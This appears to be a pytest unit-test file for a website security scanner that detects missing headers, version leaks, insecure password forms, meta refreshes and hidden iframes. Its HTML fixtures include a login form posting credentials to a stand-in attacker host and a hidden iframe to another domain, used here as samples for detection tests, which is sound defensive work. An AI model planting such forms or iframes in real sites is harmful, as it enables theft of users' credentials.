"""
Unit tests for Website Security Assessment Module.
"""
from unittest.mock import AsyncMock, MagicMock, patch
import httpx
import pytest

from app.scanner.modules.security_assessment import SecurityAssessmentModule


def test_audit_missing_security_headers():
    mod = SecurityAssessmentModule()
    findings = []
    headers = {"content-type": "text/html"}  # No security headers
    audit = mod._audit_security_headers(headers, is_https=True, scan_id="scan-sec-1", findings=findings)

    assert audit["hsts"] is False
    assert audit["csp"] is False
    assert audit["x_frame_options"] is False
    assert audit["x_content_type_options"] is False

    titles = [f["title"] for f in findings]
    assert any("HSTS" in t for t in titles)
    assert any("CSP" in t for t in titles)
    assert any("Clickjacking" in t for t in titles)
    assert any("X-Content-Type-Options" in t for t in titles)


def test_audit_server_version_leak():
    mod = SecurityAssessmentModule()
    findings = []
    headers = {
        "server": "Apache/2.4.41 (Ubuntu)",
        "x-powered-by": "PHP/7.4.3",
        "strict-transport-security": "max-age=31536000",
        "content-security-policy": "default-src 'self'",
        "x-frame-options": "DENY",
        "x-content-type-options": "nosniff",
    }
    audit = mod._audit_security_headers(headers, is_https=True, scan_id="scan-sec-2", findings=findings)
    assert any("Server / Technology Version Disclosure" in f["title"] for f in findings)


def test_dom_insecure_password_form_and_cross_domain_action():
    mod = SecurityAssessmentModule()
    findings = []
    html = """
    <html>
      <head><title>Login Page</title></head>
      <body>
        <form action="https://attacker-stealer.xyz/harvest" method="POST">
          <input type="text" name="username">
          <input type="password" name="password">
          <input type="submit" value="Sign In">
        </form>
      </body>
    </html>
    """
    res = mod._analyze_html_dom(html, "http://target.com/login", "target.com", is_https=False, scan_id="scan-sec-3", findings=findings)

    assert res["password_inputs_count"] == 1
    assert len(res["cross_domain_forms"]) == 1
    titles = [f["title"] for f in findings]
    assert "Insecure Password Form Over Plain HTTP" in titles
    assert "Cross-Domain Form Submission Target" in titles


def test_dom_meta_refresh_and_hidden_iframe():
    mod = SecurityAssessmentModule()
    findings = []
    html = """
    <html>
      <head>
        <meta http-equiv="refresh" content="3;url=https://redirected.com">
      </head>
      <body>
        <iframe src="https://silent-drop.com" style="display:none"></iframe>
      </body>
    </html>
    """
    res = mod._analyze_html_dom(html, "https://target.com", "target.com", is_https=True, scan_id="scan-sec-4", findings=findings)

    assert res["has_meta_refresh"] is True
    assert res["hidden_iframes_count"] == 1
    titles = [f["title"] for f in findings]
    assert any("Meta Refresh" in t for t in titles)
    assert any("Hidden Inline Iframe" in t for t in titles)


@pytest.mark.anyio
async def test_security_assessment_execute():
    mod = SecurityAssessmentModule()

    mock_response = MagicMock(spec=httpx.Response)
    mock_response.status_code = 200
    mock_response.url = httpx.URL("https://target.com")
    mock_response.history = []
    mock_response.headers = httpx.Headers({
        "Content-Type": "text/html",
        "Strict-Transport-Security": "max-age=31536000",
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
    })
    mock_response.text = "<html><head><title>Safe Site</title></head><body><h1>Welcome</h1></body></html>"

    with patch("httpx.AsyncClient.get", new_callable=AsyncMock) as mock_get:
        mock_get.return_value = mock_response

        res = await mod.execute("https://target.com", "target.com", "scan-sec-5")

        assert "data" in res
        assert "findings" in res
        assert "entities" in res
        assert res["data"]["status_code"] == 200
